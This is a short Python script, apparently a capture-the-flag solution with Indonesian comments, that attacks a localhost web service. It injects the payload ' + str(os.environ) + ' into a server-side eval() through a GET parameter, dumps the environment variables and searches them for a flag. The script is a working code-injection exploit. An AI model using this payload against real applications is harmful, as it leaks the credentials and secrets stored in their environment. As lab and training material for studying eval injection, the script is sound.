import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload Injection:
    # Kita menyuntikkan kode Python ke dalam fungsi eval()
    # Payload: ' + str(os.environ) + '
    # Tanda kutip di awal dan akhir itu buat "menutup" string asli di kode server.
    payload = "' + str(os.environ) + '"
    
    print("[*] Injecting Python Code via eval()...")
    
    try:
        # Kirim GET request dengan payload
        r = requests.get(URL, params={'name': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Coba cari format flag pwn{...} di response
            # Response bakal berisi environment variables yang berantakan
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND IN ENV: {flag.group(0)}\n")
            else:
                print("[-] Flag not found in ENV. Dumping response for manual check:")
                # Kalau regex gagal, kita print semua barangkali di-encode Base64 (sesuai hint)
                print(r.text[:500] + "...") 
                
        elif r.status_code == 403:
            print("[-] WAF Triggered! Jangan pake karakter '/'")
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
